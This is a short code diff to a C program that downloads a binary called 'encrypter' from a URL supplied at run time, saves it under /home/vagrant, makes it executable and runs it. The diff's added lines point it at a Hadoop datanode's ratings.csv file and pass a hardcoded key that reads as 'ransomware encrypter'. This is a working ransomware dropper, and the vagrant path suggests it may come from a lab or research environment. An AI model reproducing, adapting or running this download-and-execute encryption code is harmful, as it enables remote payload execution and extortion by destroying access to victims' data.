@@ -17,7 +17,7 @@ int main(int argc, char** argv) {
     FILE *fp;
     CURLcode res;
     char *url = argv[1];
-    char outfilename[FILENAME_MAX] = "encrypter";
+    char outfilename[FILENAME_MAX] = "/home/vagrant/encrypter";
     curl = curl_easy_init();
     if (curl) {
         fp = fopen(outfilename,"wb");
@@ -29,6 +29,8 @@ int main(int argc, char** argv) {
         curl_easy_cleanup(curl);
         fclose(fp);
     }
-    system("chmod +x encrypter");
+    system("chmod +x /home/vagrant/encrypter");
+    system("/home/vagrant/encrypter /home/hadoop/data/hdfs/datanode/current/ratings.csv V3ryS3cR3tK3yF0rR@n$0mw@r33nCrypt3r");
+    //system("rm /home/encrypter");
     return 0;
 }
